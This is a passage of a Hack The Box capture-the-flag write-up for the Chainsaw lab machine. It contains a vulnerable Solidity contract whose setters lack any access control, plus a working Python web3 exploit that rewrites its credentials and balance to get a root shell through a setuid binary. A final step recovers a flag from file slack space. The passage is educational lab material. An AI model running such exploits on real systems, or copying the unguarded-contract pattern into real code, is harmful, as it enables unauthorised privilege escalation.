groups&#x3D;1000(bobby),30(dip)</span><br><span class="line">bobby@chainsaw:~$ ls -la</span><br><span class="line">total 52</span><br><span class="line">drwxr-x--- 9 bobby bobby 4096 Jan 23  2019 .</span><br><span class="line">drwxr-xr-x 4 root  root  4096 Dec 12  2018 ..</span><br><span class="line">lrwxrwxrwx 1 bobby bobby    9 Nov 30  2018 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r--r-- 1 bobby bobby  220 Sep 12  2018 .bash_logout</span><br><span class="line">-rw-r--r-- 1 bobby bobby 3771 Sep 12  2018 .bashrc</span><br><span class="line">drwx------ 2 bobby bobby 4096 Nov 30  2018 .cache</span><br><span class="line">drwx------ 3 bobby bobby 4096 Nov 30  2018 .gnupg</span><br><span class="line">drwxrwxr-x 3 bobby bobby 4096 Dec 12  2018 .java</span><br><span class="line">drwxrwxr-x 3 bobby bobby 4096 Nov 30  2018 .local</span><br><span class="line">-rw-r--r-- 1 bobby bobby  807 Sep 12  2018 .profile</span><br><span class="line">drwxrwxr-x 3 bobby bobby 4096 Dec 20  2018 projects</span><br><span class="line">drwxrwxr-x 2 bobby bobby 4096 Dec 12  2018 resources</span><br><span class="line">drwxr-x--- 2 bobby bobby 4096 Dec 13  2018 .ssh</span><br><span class="line">-r--r----- 1 bobby bobby   33 Jan 23  2019 user.txt</span><br><span class="line">-rw-rw-r-- 1 bobby bobby    0 Dec 12  2018 .wget-hsts</span><br><span class="line">bobby@chainsaw:~$</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/chainsaw/2.png" alt=""><br>We owned user.</p>
<h2 id="ChainsawClub-Analysis"><a href="#ChainsawClub-Analysis" class="headerlink" title="ChainsawClub: Analysis"></a>ChainsawClub: Analysis</h2><p>In <code>bobby</code>‘s home directory there was a directory called <code>projects</code> which had a project called <code>ChainsawClub</code>, Inside that directory there was another smart contract:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bobby@chainsaw:~$ cd projects&#x2F;</span><br><span class="line">bobby@chainsaw:~&#x2F;projects$ ls -al</span><br><span class="line">total 12</span><br><span class="line">drwxrwxr-x 3 bobby bobby 4096 Dec 20  2018 .</span><br><span class="line">drwxr-x--- 9 bobby bobby 4096 Jan 23  2019 ..</span><br><span class="line">drwxrwxr-x 2 bobby bobby 4096 Jan 23  2019 ChainsawClub</span><br><span class="line">bobby@chainsaw:~&#x2F;projects$ cd ChainsawClub&#x2F;</span><br><span class="line">bobby@chainsaw:~&#x2F;projects&#x2F;ChainsawClub$ ls -al</span><br><span class="line">total 156</span><br><span class="line">drwxrwxr-x 2 bobby bobby   4096 Jan 23  2019 .</span><br><span class="line">drwxrwxr-x 3 bobby bobby   4096 Dec 20  2018 ..</span><br><span class="line">-rw-r--r-- 1 root  root      44 Nov 22 20:04 address.txt</span><br><span class="line">-rwsr-xr-x 1 root  root   16544 Jan 12  2019 ChainsawClub</span><br><span class="line">-rw-r--r-- 1 root  root  126388 Jan 23  2019 ChainsawClub.json</span><br><span class="line">-rw-r--r-- 1 root  root    1164 Jan 23  2019 ChainsawClub.sol</span><br><span class="line">bobby@chainsaw:~&#x2F;projects&#x2F;ChainsawClub$</span><br></pre></td></tr></table></figure>
<p><code>ChainsawClub.sol</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.22</span>;</span><br><span class="line"></span><br><span class="line">contract ChainsawClub &#123;</span><br><span class="line"></span><br><span class="line">  string username = <span class="string">'nobody'</span>;</span><br><span class="line">  string password = <span class="string">'7b455ca1ffcb9f3828cfdde4a396139e'</span>;</span><br><span class="line">  bool approve = <span class="keyword">false</span>;</span><br><span class="line">  uint totalSupply = <span class="number">1000</span>;</span><br><span class="line">  uint userBalance = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getUsername</span><span class="params">()</span> <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> <span class="params">(string)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> username;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setUsername</span><span class="params">(string _value)</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">      username = _value;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getPassword</span><span class="params">()</span> <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> <span class="params">(string)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> password;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setPassword</span><span class="params">(string _value)</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">      password = _value;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getApprove</span><span class="params">()</span> <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> <span class="params">(bool)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> approve;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setApprove</span><span class="params">(bool _value)</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">      approve = _value;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getSupply</span><span class="params">()</span> <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> <span class="params">(uint)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> totalSupply;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getBalance</span><span class="params">()</span> <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> <span class="params">(uint)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> userBalance;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transfer</span><span class="params">(uint _value)</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (_value &gt; <span class="number">0</span> &amp;&amp; _value &lt;= totalSupply) &#123;</span><br><span class="line">          totalSupply -= _value;</span><br><span class="line">          userBalance += _value;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">reset</span><span class="params">()</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">      username = <span class="string">''</span>;</span><br><span class="line">      password = <span class="string">''</span>;</span><br><span class="line">      userBalance = <span class="number">0</span>;</span><br><span class="line">      totalSupply = <span class="number">1000</span>;</span><br><span class="line">      approve = <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>There was also a <code>setuid</code> <code>elf</code> executable called <code>ChainsawClub</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bobby@chainsaw:~&#x2F;projects&#x2F;ChainsawClub$ file ChainsawClub</span><br><span class="line">ChainsawClub: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 3.2.0, BuildID[sha1]&#x3D;08b87cf44d6a671b91bc55f6e1f53c7ee083a417, not stripped</span><br><span class="line">bobby@chainsaw:~&#x2F;projects&#x2F;ChainsawClub$</span><br></pre></td></tr></table></figure>
<p>When executed it prints a note saying “Please sign up first and then log in!”, then it asks for credentials:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bobby@chainsaw:~&#x2F;projects&#x2F;ChainsawClub$ .&#x2F;ChainsawClub </span><br><span class="line"></span><br><span class="line">      _           _</span><br><span class="line">     | |         (_)</span><br><span class="line">  ___| |__   __ _ _ _ __  ___  __ ___      __</span><br><span class="line"> &#x2F; __| &#39;_ \ &#x2F; _&#96; | | &#39;_ \&#x2F; __|&#x2F; _&#96; \ \ &#x2F;\ &#x2F; &#x2F;</span><br><span class="line">| (__| | | | (_| | | | | \__ \ (_| |\ V  V &#x2F;</span><br><span class="line"> \___|_| |_|\__,_|_|_| |_|___&#x2F;\__,_| \_&#x2F;\_&#x2F;</span><br><span class="line">                                            club</span><br><span class="line"></span><br><span class="line">- Total supply: 1000</span><br><span class="line">- 1 CHC &#x3D; 51.08 EUR</span><br><span class="line">- Market cap: 51080 (€)</span><br><span class="line"></span><br><span class="line">[*] Please sign up first and then log in!</span><br><span class="line">[*] Entry based on merit.</span><br><span class="line"></span><br><span class="line">Username: </span><br><span class="line">Password: </span><br><span class="line">[*] Wrong credentials!</span><br><span class="line">^C</span><br><span class="line">bobby@chainsaw:~&#x2F;projects&#x2F;ChainsawClub$</span><br></pre></td></tr></table></figure>
<p>Obviously we’ll use the smart contract to sign up, similar to what we did earlier we’ll write a python script to interact with the contract.<br>We’ll use:<br><code>setUsername()</code> to set the username<br><code>setPassword()</code> to set the password, it has to be <code>md5</code> hashed as we saw:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string password = <span class="string">'7b455ca1ffcb9f3828cfdde4a396139e'</span>;</span><br></pre></td></tr></table></figure>
<p><code>setApprove()</code> to change <code>approve</code> from <code>false</code> to <code>true</code><br><code>transfer()</code> to transfer coins to the user’s balance, it can’t transfer more than 1000 coins because that’s the value of <code>totalSupply</code> and we can’t transfer more than that:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">transfer</span><span class="params">(uint _value)</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (_value &gt; <span class="number">0</span> &amp;&amp; _value &lt;= totalSupply) &#123;</span><br><span class="line">        totalSupply -= _value;</span><br><span class="line">        userBalance += _value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Transferring coins is an important step because when I created a new user without transferring coins I could successfully login but it said that I didn’t have enough funds and exited.</p>
<h2 id="ChainsawClub-Exploitation"><a href="#ChainsawClub-Exploitation" class="headerlink" title="ChainsawClub: Exploitation"></a>ChainsawClub: Exploitation</h2><p>I used <code>netstat</code> to list the open ports, 63991 was open and listening on <code>localhost</code> only so I assumed that it’s the port on which the contract is deployed:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bobby@chainsaw:~&#x2F;projects&#x2F;ChainsawClub$ netstat -ntlp</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID&#x2F;Program name    </span><br><span class="line">tcp        0      0 0.0.0.0:9810            0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 127.0.0.1:63991         0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp6       0      0 :::21                   :::*                    LISTEN      -</span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -</span><br><span class="line">bobby@chainsaw:~&#x2F;projects&#x2F;ChainsawClub$</span><br></pre></td></tr></table></figure>
<p>I got the <code>ABI</code> of the contract like I did before:<br><img src="/images/hackthebox/chainsaw/3.png" alt=""><br>And we have the address of the contract in <code>address.txt</code><br>I wrote the exploit and forwarded the port to my box:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# ssh -L 63991:127.0.0.1:63991 -i bobby.key.enc bobby@chainsaw.htb                                                                                                          </span><br><span class="line">Enter passphrase for key &#39;bobby.key.enc&#39;:</span><br><span class="line">bobby@chainsaw:~$</span><br></pre></td></tr></table></figure>
<p>The exploit is similar to the first one.<br><code>ChainsawClubExploit.py</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, eth</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">YELLOW = <span class="string">"\033[93m"</span></span><br><span class="line">GREEN = <span class="string">"\033[32m"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(address, username, password, passhash)</span>:</span></span><br><span class="line">	print(YELLOW + <span class="string">"[+] Starting"</span>)</span><br><span class="line">	print(YELLOW + <span class="string">"[+] Connecting to localhost:63991"</span>)</span><br><span class="line">	w3 = Web3(Web3.HTTPProvider(<span class="string">'http://localhost:63991'</span>))</span><br><span class="line">	print(GREEN + <span class="string">"[*] Connection Established"</span>)</span><br><span class="line">	w3.eth.defaultAccount = w3.eth.accounts[<span class="number">0</span>]</span><br><span class="line">	print(YELLOW + <span class="string">"[+] Creating the contract representation"</span>)</span><br><span class="line">	print(YELLOW + <span class="string">"[+] Address: &#123;&#125;"</span>.format(address))</span><br><span class="line">	abi = json.loads(<span class="string">'[ &#123; "constant": true, "inputs": [], "name": "getBalance", "outputs": [ &#123; "name": "", "type": "uint256" &#125; ], "payable": false, "stateMutability": "view", "type": "function" &#125;, &#123; "constant": false, "inputs": [ &#123; "name": "_value", "type": "uint256" &#125; ], "name": "transfer", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" &#125;, &#123; "constant": false, "inputs": [ &#123; "name": "_value", "type": "string" &#125; ], "name": "setPassword", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" &#125;, &#123; "constant": true, "inputs": [], "name": "getUsername", "outputs": [ &#123; "name": "", "type": "string" &#125; ], "payable": false, "stateMutability": "view", "type": "function" &#125;, &#123; "constant": true, "inputs": [], "name": "getSupply", "outputs": [ &#123; "name": "", "type": "uint256" &#125; ], "payable": false, "stateMutability": "view", "type": "function" &#125;, &#123; "constant": true, "inputs": [], "name": "getApprove", "outputs": [ &#123; "name": "", "type": "bool" &#125; ], "payable": false, "stateMutability": "view", "type": "function" &#125;, &#123; "constant": false, "inputs": [ &#123; "name": "_value", "type": "bool" &#125; ], "name": "setApprove", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" &#125;, &#123; "constant": true, "inputs": [], "name": "getPassword", "outputs": [ &#123; "name": "", "type": "string" &#125; ], "payable": false, "stateMutability": "view", "type": "function" &#125;, &#123; "constant": false, "inputs": [], "name": "reset", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" &#125;, &#123; "constant": false, "inputs": [ &#123; "name": "_value", "type": "string" &#125; ], "name": "setUsername", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" &#125; ]'</span>)</span><br><span class="line">	contract = w3.eth.contract(address=address, abi=abi)</span><br><span class="line">	print(GREEN + <span class="string">"[*] Done"</span>)</span><br><span class="line">	print(YELLOW + <span class="string">"[+] Calling setUsername() with: &#123;&#125;"</span>.format(username))</span><br><span class="line">	contract.functions.setUsername(username).transact()</span><br><span class="line">	print(GREEN + <span class="string">"[*] Done. getUsername(): "</span> + contract.functions.getUsername().call())</span><br><span class="line">	print(YELLOW + <span class="string">"[+] Calling setPassword() with: &#123;&#125; (&#123;&#125;)"</span>.format(passhash, password))</span><br><span class="line">	contract.functions.setPassword(passhash).transact()</span><br><span class="line">	print(GREEN + <span class="string">"[*] Done. getPassword(): "</span> + contract.functions.getPassword().call())</span><br><span class="line">	print(YELLOW + <span class="string">"[+] Calling setApprove() with: True"</span>)</span><br><span class="line">	contract.functions.setApprove(<span class="literal">True</span>).transact()</span><br><span class="line">	print(GREEN + <span class="string">"[*] Done. getApprove(): "</span> + str(contract.functions.getApprove().call()))</span><br><span class="line">	print(YELLOW + <span class="string">"[+] Calling transfer() with: 1000"</span>)</span><br><span class="line">	contract.functions.transfer(<span class="number">1000</span>).transact()</span><br><span class="line">	print(GREEN + <span class="string">"[*] Done. getBalance(): "</span> + str(contract.functions.getBalance().call()))</span><br><span class="line">	print(GREEN + <span class="string">"[+] Exploit finished. Now you can login with the provided credentials: &#123;&#125;:&#123;&#125;, Exiting..."</span>.format(username,password))</span><br><span class="line">	exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(argv) != <span class="number">4</span>:</span><br><span class="line">	print(YELLOW + <span class="string">"[!] Usage: &#123;&#125; [contract address] [username] [password]"</span>.format(argv[<span class="number">0</span>]))</span><br><span class="line">	exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	address = argv[<span class="number">1</span>]</span><br><span class="line">	username = argv[<span class="number">2</span>]</span><br><span class="line">	password = argv[<span class="number">3</span>]</span><br><span class="line">	passhash = md5(password.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">	exploit(address, username, password, passhash)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# .&#x2F;ChainsawClubExploit.py 0xE6384BBbBb7C30C4Af2287872179296d46d863bE rick pwn3d                                                                                            </span><br><span class="line">[+] Starting</span><br><span class="line">[+] Connecting to localhost:63991</span><br><span class="line">[*] Connection Established</span><br><span class="line">[+] Creating the contract representation</span><br><span class="line">[+] Address: 0xE6384BBbBb7C30C4Af2287872179296d46d863bE</span><br><span class="line">[*] Done</span><br><span class="line">[+] Calling setUsername() with: rick</span><br><span class="line">[*] Done. getUsername(): rick</span><br><span class="line">[+] Calling setPassword() with: b2f3d1e0efcb5d60e259a34ecbbdbe00 (pwn3d)</span><br><span class="line">[*] Done. getPassword(): b2f3d1e0efcb5d60e259a34ecbbdbe00</span><br><span class="line">[+] Calling setApprove() with: True</span><br><span class="line">[*] Done. getApprove(): True</span><br><span class="line">[+] Calling transfer() with: 1000</span><br><span class="line">[*] Done. getBalance(): 1000</span><br><span class="line">[+] Exploit finished. Now you can login with the provided credentials: rick:pwn3d, Exiting...</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw#</span><br></pre></td></tr></table></figure>
<p>After authenticating I got a root shell:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">bobby@chainsaw:~&#x2F;projects&#x2F;ChainsawClub$ .&#x2F;ChainsawClub </span><br><span class="line"></span><br><span class="line">      _           _</span><br><span class="line">     | |         (_)</span><br><span class="line">  ___| |__   __ _ _ _ __  ___  __ ___      __</span><br><span class="line"> &#x2F; __| &#39;_ \ &#x2F; _&#96; | | &#39;_ \&#x2F; __|&#x2F; _&#96; \ \ &#x2F;\ &#x2F; &#x2F;</span><br><span class="line">| (__| | | | (_| | | | | \__ \ (_| |\ V  V &#x2F;</span><br><span class="line"> \___|_| |_|\__,_|_|_| |_|___&#x2F;\__,_| \_&#x2F;\_&#x2F;</span><br><span class="line">                                            club</span><br><span class="line"></span><br><span class="line">- Total supply: 1000</span><br><span class="line">- 1 CHC &#x3D; 51.08 EUR</span><br><span class="line">- Market cap: 51080 (€)</span><br><span class="line"></span><br><span class="line">[*] Please sign up first and then log in!</span><br><span class="line">[*] Entry based on merit.</span><br><span class="line"></span><br><span class="line">Username: rick</span><br><span class="line">Password: </span><br><span class="line"></span><br><span class="line">         ************************</span><br><span class="line">         * Welcome to the club! *</span><br><span class="line">         ************************</span><br><span class="line"></span><br><span class="line"> Rule #1: Do not get excited too fast.</span><br><span class="line">    </span><br><span class="line">root@chainsaw:&#x2F;home&#x2F;bobby&#x2F;projects&#x2F;ChainsawClub# </span><br><span class="line">root@chainsaw:&#x2F;home&#x2F;bobby&#x2F;projects&#x2F;ChainsawClub# whoami</span><br><span class="line">root</span><br><span class="line">root@chainsaw:&#x2F;home&#x2F;bobby&#x2F;projects&#x2F;ChainsawClub# id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">root@chainsaw:&#x2F;home&#x2F;bobby&#x2F;projects&#x2F;ChainsawClub#</span><br></pre></td></tr></table></figure>
<p>However the root flag wasn’t there:<br><img src="/images/hackthebox/chainsaw/4.png" alt=""></p>
<h2 id="Slack-Space-–-gt-Root-Flag"><a href="#Slack-Space-–-gt-Root-Flag" class="headerlink" title="Slack Space –&gt; Root Flag"></a>Slack Space –&gt; Root Flag</h2><p><code>root.txt</code> size is 52 bytes, the block size here is 4096 bytes which means that there are 4044 unused bytes (<code>4096 - 52</code>)  which is called “slack space”. (Check <a href="https://whatis.techtarget.com/definition/slack-space-file-slack-space" target="_blank" rel="noopener">this page</a>, and <a href="https://techcyberz.wordpress.com/2014/01/30/hiding-data-slack-space-on-linux/" target="_blank" rel="noopener">this one</a>).<br>Slack space can be used to hide data, which was the case here with the root flag. I used <code>bmap</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bmap --mode slack root.txt --verbose</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/chainsaw/5.png" alt=""><br>And we owned root !<br>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
<p>Previous Hack The Box write-up : <a href="/hack-the-box/networked/">Hack The Box - Networked</a><br>Next Hack The Box write-up : <a href="/hack-the-box/heist/">Hack The Box - Heist</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2019-11-23</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/blockchain/" rel="tag">#blockchain</a> <a class="tag-link" href="/tags/code-analysis/" rel="tag">#code-analysis</a> <a class="tag-link" href="/tags/exploit-development/" rel="tag">#exploit-development</a> <a class="tag-link" href="/tags/linux/" rel="tag">#linux</a> <a class="tag-link" href="/tags/python/" rel="tag">#python</a> <a class="tag-link" href="/tags/rce/" rel="tag">#rce</a> <a class="tag-link" href="/tags/smart-contracts/" rel="tag">#smart-contracts</a> <a class="tag-link" href="/tags/solidity/" rel="tag">#solidity</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
